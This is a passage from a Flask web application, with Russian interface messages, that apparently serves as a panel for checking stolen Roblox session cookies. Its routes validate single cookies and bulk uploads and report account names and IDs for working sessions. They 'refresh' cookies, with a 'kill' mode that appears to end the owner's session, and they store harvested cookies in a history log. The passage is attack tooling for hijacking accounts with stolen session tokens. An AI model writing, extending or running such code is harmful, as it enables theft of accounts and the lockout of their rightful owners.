            return redirect(url_for('index'))
        else:
            return render_template_string(LOGIN_HTML, error="Неверное имя пользователя или пароль")
            
    return render_template_string(LOGIN_HTML)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route("/")
@login_required
def index():
    return render_template_string(INDEX_HTML, username=session.get('username'))

@app.route("/api/single-check", methods=["POST"])
@login_required
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
    info = get_full_info(cookie)
    report = format_full_report(info)
    add_checker_history({
        'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0,
        'usernames': [info['Username']] if info['status']=='✅' else ['Unauthed'],
        'results': [report],
        'full_reports': [{'username': info['Username'], 'user_id': info['UserID'], 'report': report}]
    })
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check", methods=["POST"])
@login_required
def api_mass_check():
    content = ""
    if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = extract_cookies_from_text(content)
    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
    
    results = mass_check(cookies)
    valid = [r for r in results if r['status']=='✅']
    formatted = [format_quick_report(r) for r in results]
    
    full_reports = []
    usernames = []
    for r in valid:
        if r.get('full_info'):
            full_reports.append({'username': r['username'], 'user_id': r['user_id'], 'report': format_full_report(r['full_info'])})
            usernames.append(r['username'])
            
    add_checker_history({
        'type': 'mass', 'total': len(results), 'valid': len(valid),
        'usernames': usernames,
        'results': formatted,
        'full_reports': full_reports
    })
    return jsonify({"success": True, "results": formatted})

@app.route("/api/fresher", methods=["POST"])
@login_required
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
    
    only_cookies = []
    usernames = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(refresh_roblox_cookie, c, mode=='kill') for c in cookies_list]
        for f in as_completed(futures):
            res = f.result()
            if res['success'] and res['new_cookie']:
                only_cookies.append(res['new_cookie'])
                usernames.append(res.get('username','?'))
    
    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'usernames': usernames, 'cookies': only_cookies})
    return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})

@app.route("/api/history/checker")
@login_required
def api_history_checker():
    return jsonify({"history": get_checker_history()})

@app.route("/api/history/fresher")
@login_required
def api_history_fresher():
    return jsonify({"history": get_fresher_history()})

@app.route("/api/history/clear/<type>", methods=["POST"])
@login_required
def api_clear_history(type):
    if type == "checker":
        clear_checker_history()
    elif type == "fresher":
        clear_fresher_history()
    return jsonify({"success": True})

@app.route("/api/clean-cookies", methods=["POST"])
@login_required
def api_clean_cookies():
    data = request.json or {}
    processed = remove_duplicates(data.get("content", ""))
    count = len([line for line in processed.split('\n') if line.strip()])
    return jsonify({"success": True, "count": count})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
